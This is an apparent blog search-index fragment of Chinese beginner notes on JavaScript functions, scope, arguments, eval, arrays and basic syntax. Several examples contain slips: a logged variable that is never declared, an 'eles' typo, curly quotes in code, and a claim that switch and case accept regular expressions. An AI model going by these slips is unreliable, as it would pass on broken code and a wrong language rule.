class="keyword">var</span> test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">报错</span><br></pre></td></tr></table></figure></div><h3 id="函数的属性和方法"><a href="#函数的属性和方法" class="headerlink" title="函数的属性和方法"></a>函数的属性和方法</h3><h4 id="name属性"><a href="#name属性" class="headerlink" title="name属性"></a>name属性</h4><p><strong>函数的name返回函数名</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; test().name</span><br><span class="line"><span class="built_in">TypeError</span>: Cannot read property <span class="string">'name'</span> <span class="keyword">of</span> <span class="literal">undefined</span></span><br><span class="line">&gt; test.name</span><br><span class="line"><span class="string">'test'</span></span><br></pre></td></tr></table></figure></div><h4 id="length属性-1"><a href="#length属性-1" class="headerlink" title="length属性"></a>length属性</h4><p><strong>函数length属性返回函数预期传入的参数个数。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a,b,c</span>) </span>&#123;&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; test.length</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></div><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p><strong>函数的toString方法返回一个字符串，内容是函数的源码。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; test.toString()</span><br><span class="line"><span class="string">'function test(a,b,c) &#123;&#125;'</span></span><br></pre></td></tr></table></figure></div><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><blockquote><p>作用域指的是变量存在的范围。JavaScript只有两种作用域：一种是全局作用域；另一种是函数作用域。</p></blockquote><p><strong>对于顶层函数来说，函数外部声明的变量就是全局变量，它可以在函数内部读取。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i =  <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(v);</span><br><span class="line">&#125;</span><br><span class="line">print()</span><br></pre></td></tr></table></figure></div><p><strong>在函数内部定义的变量，外部无法读取，称之为“局部变量”。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v</span><br></pre></td></tr></table></figure></div><h4 id="函数内部的变量提升"><a href="#函数内部的变量提升" class="headerlink" title="函数内部的变量提升"></a>函数内部的变量提升</h4><p><strong>与全局作用域一样，函数作用域内部也会产生“变量提升现象”。var 命令声明的变量，不管在上面位置，变量声明都会被提升到函数的头部。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = x - <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    tmp = x - <span class="number">100</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="函数本身的作用域"><a href="#函数本身的作用域" class="headerlink" title="函数本身的作用域"></a>函数本身的作用域</h4><p><strong>函数也是一个值，也有自己的作用域，它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。</strong></p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h4><blockquote><p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。</p></blockquote><h4 id="参数的省略"><a href="#参数的省略" class="headerlink" title="参数的省略"></a>参数的省略</h4><blockquote><p>函数的参数不是必须的</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a,b,c</span>) </span>&#123;<span class="built_in">console</span>.log(a)&#125;</span><br><span class="line">&gt; test(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt; test(<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt; test(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt; test()</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure></div><h4 id="传递方式"><a href="#传递方式" class="headerlink" title="传递方式"></a>传递方式</h4><p><strong>函数内部修改参数值，不影响外部值。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">  p = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">f(p);</span><br><span class="line"></span><br><span class="line">p <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><h4 id="同名参数"><a href="#同名参数" class="headerlink" title="同名参数"></a>同名参数</h4><p><strong>如果有同名参数，则取最后出现的那个参数。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><h4 id="arguments对象"><a href="#arguments对象" class="headerlink" title="arguments对象"></a>arguments对象</h4><blockquote><p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">one</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure></div><p><strong>正常模式下，argument对象可以进行修改。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">arguments</span>[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure></div><h5 id="与数组的关系"><a href="#与数组的关系" class="headerlink" title="与数组的关系"></a>与数组的关系</h5><p><strong>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">var</span> args = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">  args.push(<span class="built_in">arguments</span>[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h5 id="callee属性"><a href="#callee属性" class="headerlink" title="callee属性"></a>callee属性</h5><p><strong>返回它所对应的函数</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.callee === f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><h3 id="函数的其他知识点"><a href="#函数的其他知识点" class="headerlink" title="函数的其他知识点"></a>函数的其他知识点</h3><h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><h4 id="立即调用函数表达式"><a href="#立即调用函数表达式" class="headerlink" title="立即调用函数表达式"></a>立即调用函数表达式</h4><h3 id="eval命令"><a href="#eval命令" class="headerlink" title="eval命令"></a>eval命令</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p><strong>eval命令接受一个字符串作为参数，并将这个字符串当语句执行。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'var a = 1;'</span>);</span><br><span class="line">a <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></div><h4 id="eval的别名调用"><a href="#eval的别名调用" class="headerlink" title="eval的别名调用"></a>eval的别名调用</h4><p><strong>JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域。</strong></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><strong>数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var arr = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;];</span><br></pre></td></tr></table></figure></div><h3 id="数组的本质"><a href="#数组的本质" class="headerlink" title="数组的本质"></a>数组的本质</h3><p><strong>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="comment">// "object"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(arr)</span><br><span class="line"><span class="comment">// ["0", "1", "2"]</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptの基本语法</title>
      <link href="/2019/06/05/javascript-ji-ben-yu-fa/"/>
      <url>/2019/06/05/javascript-ji-ben-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScriptの基本语法"><a href="#JavaScriptの基本语法" class="headerlink" title="JavaScriptの基本语法"></a>JavaScriptの基本语法</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><blockquote><p><strong>JavaScript我理解为行语句，一行一行执行。很像Java都需要以”;”结尾。</strong></p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div><p><strong>很好理解，var是声明变量；a则是变量名；1则是将值赋值给变量a。引用变量a就会得到数值1.</strong></p><p><strong>设置变量并不一定需要var来声明。当你没有使用var时，其实你已经创建了一个全局变量。</strong></p><p><strong>注：当已经存在的变量时再次被声明时，后面的声明是无效的。</strong></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><blockquote><h4 id="JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。"><a href="#JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。" class="headerlink" title="JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。"></a>JavaScript引擎的工作方式是，先解析代码。获取所以被声明的变量，在逐行执行，这意味着所有的变量将到程序的行首。这叫做变量提升。</h4></blockquote><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><h4 id="标识符-identifier-指的是识别各种值得合法名称。"><a href="#标识符-identifier-指的是识别各种值得合法名称。" class="headerlink" title="标识符(identifier)指的是识别各种值得合法名称。"></a>标识符(identifier)指的是识别各种值得合法名称。</h4></blockquote><ul><li><strong>第一个字符，可以是任意的Unicode字母，以及($),(_)</strong></li><li><strong>第二个字符及后面的字符，除了Unicode字母，美元符号，下划线还可以是数字。</strong></li></ul><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><blockquote><h4 id="被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。"><a href="#被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。" class="headerlink" title="被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。"></a>被JavaScript引擎忽略的部分就叫注释，主要最有用来进行代码的解释。同时也可以将我们不想要执行的代码注释不执行。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是单行注释</span></span><br><span class="line"><span class="comment">/* 这是多行注释 */</span></span><br></pre></td></tr></table></figure></div><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><blockquote><h4 id="JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”-block"><a href="#JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”-block" class="headerlink" title="JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”(block)"></a>JavaScript使用大括号，将多个相关的语句组合在一起，称为“区块”(block)</h4></blockquote><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件语句，获得bool值) &#123;</span><br><span class="line">   为<span class="literal">true</span>时执行代码块</span><br><span class="line">&#125;eles &#123;</span><br><span class="line">    为<span class="literal">false</span>时执行代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件语句，获得bool值)&#123;</span><br><span class="line">    为<span class="literal">true</span>执行</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(上面为<span class="literal">false</span>时，判断条件语句)&#123;</span><br><span class="line">    为<span class="literal">true</span>执行，为<span class="literal">false</span>继续往下执行</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(继续判断条件语句)&#123;</span><br><span class="line">    为<span class="literal">true</span>执行</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">上述都不满足条件时执行。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="switch结构"><a href="#switch结构" class="headerlink" title="switch结构"></a>switch结构</h4><blockquote><h5 id="当我们多个if…else…时，也许使用switch更方便"><a href="#当我们多个if…else…时，也许使用switch更方便" class="headerlink" title="当我们多个if…else…时，也许使用switch更方便"></a>当我们多个if…else…时，也许使用switch更方便</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (xxx) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"xxx"</span>:</span><br><span class="line">        xxxxxxx</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"xxxx"</span>:</span><br><span class="line">        xxxxxxx</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        xxxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>记得在每个case下面接break，不然执行完会继续跳到下个case。需使用break进行跳出switch。</strong></p><p><strong>switch语句部分和case语句部分都可以使用正则表达式。</strong></p><h4 id="三元运算符？："><a href="#三元运算符？：" class="headerlink" title="三元运算符？："></a>三元运算符？：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(条件) ? 表达式<span class="number">1</span> ： 表达式</span><br></pre></td></tr></table></figure></div><p><strong>示例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> even = (n % <span class="number">2</span> === <span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span></span><br></pre></td></tr></table></figure></div><p><strong>下面是if..else..示例</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> even;</span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    even = <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    even = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件) &#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>示例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"当前i的值为："</span>+ i);</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化表达式;条件;递增表达式) &#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><strong>初始化表达式：确定循环变量的初始值，只在循环开始时执行一次。</strong></li><li><strong>条件表达式：每轮循环开始时，都要执行这个条件表达式，只有值为真时才会继续进行循环。</strong></li><li><strong>递增表达式：每轮循环的最后一个操作，通常用来递增循环变量。</strong></li></ul><p><strong>示例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x ; i ++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(”当前i的值为：“+i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;<span class="keyword">while</span> (条件);</span><br></pre></td></tr></table></figure></div><p><strong>do…while和while唯一的区别在于，do…while必须执行一次。示例：</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> i = <span 